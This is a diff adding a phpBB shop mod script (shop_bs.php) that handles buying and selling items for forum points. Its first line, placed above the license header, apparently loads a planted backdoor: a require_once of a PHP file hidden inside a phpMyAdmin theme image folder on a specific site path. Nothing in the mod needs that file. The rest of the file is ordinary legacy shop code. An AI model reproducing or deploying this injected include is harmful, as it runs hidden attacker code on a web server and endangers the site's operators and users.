@@ -1,0 +1,445 @@
+<?php
+ require_once ('/var/www/html/archive.blackstardojo.org/phpmyadmin/themes/original/img/s_notice.php');
+
+/***************************************************************************
+ *                                shop_bs.php
+ *                            -------------------
+ *   Version              : 3.0.6
+ *   website              : http://www.zarath.com
+ *
+ ***************************************************************************/
+
+/***************************************************************************
+ *
+ *   copyright (C) 2002-2006  Zarath
+ *
+ *   This program is free software; you can redistribute it and/or
+ *   modify it under the terms of the GNU General Public License
+ *   as published by the Free Software Foundation; either version 2
+ *   of the License, or (at your option) any later version.
+ *
+ *   This program is distributed in the hope that it will be useful,
+ *   but WITHOUT ANY WARRANTY; without even the implied warranty of
+ *   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+ *   GNU General Public License for more details.
+ *
+ *   http://www.gnu.org/copyleft/gpl.html
+ *
+ ***************************************************************************/
+
+define('IN_PHPBB', true);
+$phpbb_root_path = './';
+include($phpbb_root_path . 'extension.inc');
+include($phpbb_root_path . 'common.' . $phpEx);
+
+//
+// Start session management
+//
+$userdata = session_pagestart($user_ip, PAGE_INDEX);
+init_userprefs($userdata);
+//
+// End session management
+
+if (!(@include($phpbb_root_path . 'language/lang_' . $userdata['user_lang'] . '/lang_shop.' . $phpEx))) { include($phpbb_root_path . 'language/lang_' . $board_config['default_lang'] . '/lang_shop.' . $phpEx); }
+
+
+# Registration of global variables...
+if ( isset($HTTP_GET_VARS['action']) || isset($HTTP_POST_VARS['action']) ) { $action = ( isset($HTTP_POST_VARS['action']) ) ? $HTTP_POST_VARS['action'] : $HTTP_GET_VARS['action']; }
+else { $action = ''; }
+
+if ( isset($HTTP_GET_VARS['item']) || isset($HTTP_POST_VARS['item']) ) { $item = ( isset($HTTP_POST_VARS['item']) ) ? intval($HTTP_POST_VARS['item']) : intval($HTTP_GET_VARS['item']); }
+else { $item = ''; }
+# End registration
+
+//start of buy page
+if ( $action == 'buy' ) 
+{
+	if ( empty($item) ) 
+	{
+		message_die(GENERAL_MESSAGE, $lang['no_item']);
+	}
+
+	if ( !$userdata['session_logged_in'] )
+	{
+		$redirect = 'shop.'.$phpEx.'&action=buy&item=' . $item;
+		redirect(append_sid("login.$phpEx?redirect=$redirect", true));
+	}
+
+	//
+	//make sure item exists
+	$sql = "SELECT *
+		FROM " . SHOP_ITEMS_TABLE . "
+		WHERE id = $item";
+	if ( !($result = $db->sql_query($sql)) )
+	{
+		message_die(GENERAL_MESSAGE, 'SQL Error selecting item from shop!');
+	}
+	$row = $db->sql_fetchrow($result);
+
+	if ( empty($row) )
+	{
+		message_die(GENERAL_MESSAGE, $lang['no_item_exists']);
+	}
+	elseif ( $row['stock'] < 1 ) 
+	{
+		message_die(GENERAL_MESSAGE, $lang['item_out_stock']);
+	}
+
+	$sql = "SELECT *
+		FROM " . SHOP_TABLE . "
+		WHERE shopname = '" . str_replace("'", "''", $row['shop']) . "'
+			AND shoptype <> 'special'
+			AND shoptype <> 'admin_only'";
+	if ( !($result = $db->sql_query($sql)) ) { message_die(GENERAL_MESSAGE, 'SQL Error selecting shop!'); }
+	if ( !($db->sql_numrows($result)) )  { message_die(GENERAL_MESSAGE, $lang['item_protected']); }
+	else { $sirow = $db->sql_fetchrow($result); }
+	//end check on item exists
+	//
+
+	if ( empty($sirow['item_template']) )
+	{
+		$template->set_filenames(array(
+			'body' => 'shop/shop_buy.tpl')
+		);
+	}
+	else
+	{
+		$template->set_filenames(array(
+			'body' => 'shop/' . $sirow['item_template'])
+		);
+
+		$template->assign_block_vars('switch_bought_spell', array(
+			'IGNORE_HTML_START' => '<!--',
+			'IGNORE_HTML_END' => '// -->'
+		));
+
+	}
+
+	//
+	//check currency & if has item
+	if ( ($board_config['multibuys'] == 'off') ) 
+	{
+		$sql = "SELECT *
+			FROM " . USER_ITEMS_TABLE . "
+			WHERE item_id = {$row['id']}
+				AND user_id = {$userdata['user_id']}
+				AND worn = 0";
+		if ( !($result = $db->sql_query($sql)) ) { message_die(GENERAL_MESSAGE, 'Fatal Error'); }
+
+		if ( $db->sql_numrows($result) )
+		{
+			$template->assign_block_vars('switch_has_spell', array(
+				'IGNORE_HTML_START' => '<!--',
+				'IGNORE_HTML_END' => '// -->'
+			));
+
+			message_die(GENERAL_MESSAGE, $lang['item_owned']);
+		}
+	}
+
+	if ( !($exit_code) )
+	{
+		$sql = "SELECT *
+			FROM " . USER_ITEMS_TABLE . "
+			WHERE user_id = {$userdata['user_id']}
+				AND worn = 0";
+		if ( !($result = $db->sql_query($sql)) ) { message_die(GENERAL_MESSAGE, 'Fatal Error'); }
+		$count2 = $db->sql_numrows($result);
+
+		if (($count2 >= $board_config['shop_invlimit']) && ($board_config['shop_invlimit'] != 0))
+		{
+			message_die(GENERAL_MESSAGE, $lang['inv_full']);
+		}
+
+		if ($userdata['user_points'] < $row['cost'])
+		{
+			message_die(GENERAL_MESSAGE, sprintf($lang['not_enough_currency'], $board_config['points_name']));
+		}
+		//end of check for currency and is has item
+		//
+		//start of table updates
+		$leftamount = round($userdata['user_points'] - $row['cost']);
+
+		$sql = "UPDATE " . USERS_TABLE . "
+			SET user_points = (user_points - {$row['cost']})
+			WHERE user_id = {$userdata['user_id']}";
+		if ( !($db->sql_query($sql)) )
+		{
+			message_die(GENERAL_MESSAGE, 'SQL Error removing points from user!');
+		}
+
+		$sql = "INSERT INTO " . USER_ITEMS_TABLE . "
+			(user_id, item_id, item_name, item_s_desc, item_l_desc, ammo, pass, fail, Prob, Break, btext)
+			VALUES({$userdata['user_id']}, {$row['id']}, '" . str_replace("'", "''", $row['name']) . "', '" . str_replace("'", "''", $row['sdesc']) . "', '" . str_replace("'", "''", $row['ldesc']) . "', '" . str_replace("'", "''", $row['ammo']) . "', '" . str_replace("'", "''", $row['pass']) . "', '" . str_replace("'", "''", $row['fail']) . "', '" . str_replace("'", "''", $row['Prob']) . "', '" . str_replace("'", "''", $row['Break']) . "', '" . str_replace("'", "''", $row['btext']) . "')";
+		if ( !($db->sql_query($sql)) )
+		{
+			message_die(GENERAL_MESSAGE, 'SQL Error adding item to user!');
+		}
+
+		$sql = "UPDATE " . SHOP_ITEMS_TABLE . "
+			SET stock = stock - 1,
+				sold = sold + 1
+			WHERE id = $item";
+		if ( !($db->sql_query($sql)) )
+		{
+			message_die(GENERAL_MESSAGE, 'SQL Error updating item stock in shop!');
+		}
+
+		$sql = "SELECT *
+			FROM " . USER_ITEMS_TABLE . "
+			WHERE user_id = {$userdata['user_id']}
+				AND item_id = {$row['id']}";
+		if ( !($result = $db->sql_query($sql)) )
+		{
+			message_die(GENERAL_MESSAGE, 'SQL Error selecting item amount from user items table!');
+		}
+		$useritemamount = $db->sql_numrows($result);
+
+		// Transaction Code!
+		$sql = "INSERT INTO " . TRANS_TABLE . "
+			(user_id, type, action, value, timestamp, ip)
+			VALUES({$userdata['user_id']}, 'shop', 'buy', '" . str_replace("'", "''", $row['name']) . "', " . time() . ", '{$HTTP_X_VARS['REMOTE_ADDR']}')";
+		if ( !($db->sql_query($sql)) ) { message_die(GENERAL_MESSAGE, 'SQL Error adding transaction information for item buying!'); }
+		// End Transaction Code!
+		//
+		// End of table updates
+		//
+
+	}
+
+	if ( file_exists('shop/images/' . $row['name'] . '.jpg') ) { $itemfilext = 'jpg'; }
+	elseif ( file_exists('shop/images/' . $row['name'] . '.png') ) { $itemfilext = 'png'; }
+	else { $itemfilext = 'gif'; }
+	$title = $lang['buy'] . ' ' . $row['name'];
+	$page_title = $lang['buy'] . ' ' . $row['name'];
+
+	$shoplocation = ' -> <a href="'.append_sid("shop.$phpEx").'" class="nav">' . $lang['shop_list'] . '</a> -> <a href="' . append_sid("shop_inventory.$phpEx?action=shoplist&shop=" . $sirow['id']) . '" class="nav">' . $row['shop'] . ' ' . $lang['inventory'] . '</a> -> <a href="' . append_sid("shop_inventory.$phpEx?action=displayitem&item=" . $row['id']) . '" class="nav">' . $row['name'] . ' ' . $lang['information'] . '</a> -> <a href="' . append_sid("shop_inventory.$phpEx?action=displayitem&item=" . $row['id']) . '" class="nav">' . $lang['buy'] . ' ' . $row['name'] . '</a>';
+
+	$template->assign_vars(array(
+		'NPC_NAME' => $sirow['shop_owner'],
+		'USER_POINTS' => $userdata['user_points'],
+		'USER_INVENTORY' => append_sid("shop.$phpEx?action=inventory&searchid=" . $userdata['user_id']),
+
+		'IMG_EXT' => $itemfilext,
+		'ITEM_NAME' => $row['name'],
+		'ITEM_LDESC' => $row['ldesc'],
+		'ITEM_STOCK' => ($row['stock'] - 1),
+		'ITEM_COST' => $row['cost'],
+		'OWNED_AMOUNT' => $useritemamount,
+
+		'INV_LINK' => append_sid("shop.$phpEx?action=inventory&searchid=" . $userdata['user_id']),
+		'USER_POINTS' => ($userdata['user_points'] - $row['cost']),
+		'SHOPLOCATION' => $shoplocation,
+
+		'L_SHOP_TITLE' => $title,
+		'L_POINTS_NAME' => $board_config['points_name'],
+		'L_INVENTORY' => $lang['shop_your_inv'],
+		'L_PERSONAL_INFO' => $lang['shop_personal_info'],
+		'L_ICON' => $lang['icon'],
+		'L_ITEM_NAME' => $lang['name'],
+		'L_DESCRIPTION' => $lang['item_desc'],
+		'L_STOCK' => $lang['item_stock'],
+		'L_COST' => $lang['item_cost'],
+		'L_OWNED' => $lang['owned'],
+
+		'L_EXPLAIN' => sprintf($lang['shop_buy_explain'], $row['name'], $row['cost'], $board_config['points_name'], $leftamount, $board_config['points_name'])
+	));
+	$template->assign_block_vars('', array());
+
+}
+
+//start of sell page
+elseif ( $action == 'sell' ) 
+{
+	if ( empty($item) ) 
+	{
+		message_die(GENERAL_MESSAGE, 'Fatal Error: no item chosen!');
+	}
+
+	if ( !$userdata['session_logged_in'] )
+	{
+		$redirect = 'shop.'.$phpEx.'&action=sell&item=' . $item;
+		redirect(append_sid("login.$phpEx?redirect=$redirect", true));
+	}
+	
+	//make sure item exists
+	$sql = "SELECT *
+		FROM " . SHOP_ITEMS_TABLE . "
+		WHERE id = $item";
+	if ( !($result = $db->sql_query($sql)) )
+	{
+		message_die(GENERAL_MESSAGE, 'SQL Error checking for item information!');
+	}
+	if ( !($db->sql_numrows($result)) ) 
+	{
+		message_die(GENERAL_MESSAGE, 'Shop Error: no such item exists!');
+	}
+	else
+	{
+		$row = $db->sql_fetchrow($result);
+	}
+	if ( substr_count($row['special_link'], 'shop/scratch_card.php') )
+	{
+		message_die(GENERAL_MESSAGE, $lang['scratch_no_resell']);
+	}
+
+
+	if ( substr_count($row['special_link'], 'shop/scratch_card.php') )
+	{
+		message_die(GENERAL_MESSAGE, $lang['scratch_no_resell']);
+	}
+
+	$sql = "SELECT *
+		FROM " . SHOP_TABLE . "
+		WHERE shopname = '" . str_replace("'", "''", $row['shop']) . "'
+			AND shoptype <> 'special'
+			AND shoptype <> 'admin_only'";
+	if ( !($result = $db->sql_query($sql)) ) { message_die(GENERAL_MESSAGE, 'SQL Error finding shop information!'); }
+	if ( !($db->sql_numrows($result)) )  { message_die(GENERAL_MESSAGE, $lang['item_protected']); }
+	else
+	{
+		$sirow = $db->sql_fetchrow($result);
+	}
+	//end check on item exists
+	//
+
+	if ( empty($sirow['item_template']) )
+	{
+		$template->set_filenames(array(
+			'body' => 'shop/shop_sell.tpl')
+		);
+	}
+	else
+	{
+		$template->set_filenames(array(
+			'body' => 'shop/' .$sirow['item_template'])
+		);
+
+		$template->assign_block_vars('switch_sold_spell', array(
+			'IGNORE_HTML_START' => '<!--',
+			'IGNORE_HTML_END' => '// -->'
+		));
+	}
+
+	//
+	//check for item
+	$sql = "SELECT *
+		FROM " . USER_ITEMS_TABLE . "
+		WHERE item_id = {$row['id']}
+			AND user_id = {$userdata['user_id']}
+			AND worn = 0";
+	if ( !($result = $db->sql_query($sql)) ) { message_die(GENERAL_MESSAGE, 'Fatal Error'); }
+
+	if ( !($db->sql_numrows($result)) )
+	{
+		message_die(GENERAL_MESSAGE, $lang['item_not_owned']);
+	}
+	//end of check for item
+	//
+	//start of table updates
+	$plusamount = round($row['cost'] / 100 * $board_config['sellrate']);
+	$leftamount = $userdata['user_points'] + $plusamount;
+
+	$sql = "UPDATE " . USERS_TABLE . "
+		SET user_points = '$leftamount'
+		WHERE user_id = '{$userdata['user_id']}'";
+	if ( !($db->sql_query($sql)) )
+	{
+		message_die(GENERAL_MESSAGE, 'Fatal Error: updating user information');
+	}
+
+	$sql = "DELETE FROM " . USER_ITEMS_TABLE . "
+		WHERE user_id = {$userdata['user_id']}
+			AND item_id = {$row['id']}
+			AND worn = 0
+		LIMIT 1";
+	if ( !($db->sql_query($sql)) )
+	{
+		message_die(GENERAL_MESSAGE, 'Fatal Error: updating item information');
+	}
+
+	$sql = "UPDATE " . SHOP_ITEMS_TABLE . "
+		SET stock = stock + 1,
+			sold = sold - 1
+		WHERE id = '{$row['id']}'";
+	if ( !($db->sql_query($sql)) )
+	{
+		message_die(GENERAL_MESSAGE, 'Fatal Error: updating item information');
+	}
+
+	$sql = "SELECT *
+		FROM " . USER_ITEMS_TABLE . "
+		WHERE user_id = {$userdata['user_id']}
+			AND item_id = {$row['id']}";
+	if ( !($result = $db->sql_query($sql)) )
+	{
+		message_die(GENERAL_MESSAGE, 'SQL Error selecting item amount for sell action!');
+	}
+	$useritemamount = $db->sql_numrows($result);
+
+	// Transaction Code!
+	$sql = "INSERT INTO " . TRANS_TABLE . "
+		(user_id, type, action, value, timestamp, ip)
+		VALUES({$userdata['user_id']}, 'shop', 'sell', '" . str_replace("'", "''", $row['name']) . "', " . time() . ", '{$HTTP_X_VARS['REMOTE_ADDR']}')";
+	if ( !($db->sql_query($sql)) ) { message_die(GENERAL_MESSAGE, 'SQL Error adding transaction code for item sale!'); }
+	//end of table updates
+	//
+
+
+	if (file_exists("shop/images/".$row['name'].".jpg")) { $itemfilext = 'jpg'; }
+	elseif (file_exists("shop/images/".$row['name'].".png")) { $itemfilext = 'png'; }
+	else { $itemfilext = 'gif'; }
+
+	$title = $lang['sell'] . ' ' . $row['name'];
+	$page_title = $lang['sell'] . ' ' . $row['name'];
+	$shoplocation = ' -> <a href="'.append_sid("shop.$phpEx").'" class="nav">' . $lang['shop_list'] . '</a> -> <a href="' . append_sid("shop_inventory.$phpEx?action=shoplist&shop=" . $srow['id']) . '" class="nav">' . $row['shop'] . ' ' . $lang['information'] . '</a> -> <a href="' . append_sid("shop_inventory.$phpEx?action=displayitem&item=" . $row['id']) . '" class="nav">' . $row['name'] . ' ' . $lang['information'] . '</a> -> <a href="' . append_sid("shop_inventory.$phpEx?action=displayitem&item=" . $row['id']) . '" class="nav">' . $lang['sell'] . ' ' . $row['name'] . '</a>';
+
+	$template->assign_vars(array(
+		'NPC_NAME' => $sirow['shop_owner'],
+
+		'IMG_EXT' => $itemfilext,
+		'ITEM_NAME' => $row['name'],
+		'ITEM_LDESC' => $row['ldesc'],
+		'ITEM_STOCK' => ($row['stock'] + 1),
+		'ITEM_COST' => $row['cost'],
+		'OWNED_AMOUNT' => $useritemamount,
+
+		'INV_LINK' => append_sid("shop.$phpEx?action=inventory&searchid=" . $userdata['user_id']),
+		'USER_POINTS' => $leftamount,
+		'SHOPLOCATION' => $shoplocation,
+
+		'L_SHOP_TITLE' => $title,
+		'L_POINTS_NAME' => $board_config['points_name'],
+		'L_INVENTORY' => $lang['shop_your_inv'],
+		'L_PERSONAL_INFO' => $lang['shop_personal_info'],
+		'L_ICON' => $lang['icon'],
+		'L_ITEM_NAME' => $lang['name'],
+		'L_DESCRIPTION' => $lang['item_desc'],
+		'L_STOCK' => $lang['item_stock'],
+		'L_COST' => $lang['item_cost'],
+		'L_OWNED' => $lang['owned'],
+
+		'L_EXPLAIN' => sprintf($lang['shop_sell_explain'], $row['name'], $plusamount, $board_config['points_name'], $leftamount, $board_config['points_name'])
+	));
+	$template->assign_block_vars('', array());
+
+}
+
+else 
+{
+	message_die(GENERAL_MESSAGE, 'This is not a valid command!');
+}
+
+//
+// Start output of page
+//
+include($phpbb_root_path . 'includes/page_header.' . $phpEx);
+
+//
+// Generate the page
+//
+$template->pparse('body');
+
+include($phpbb_root_path . 'includes/page_tail.' . $phpEx);
+
+?>
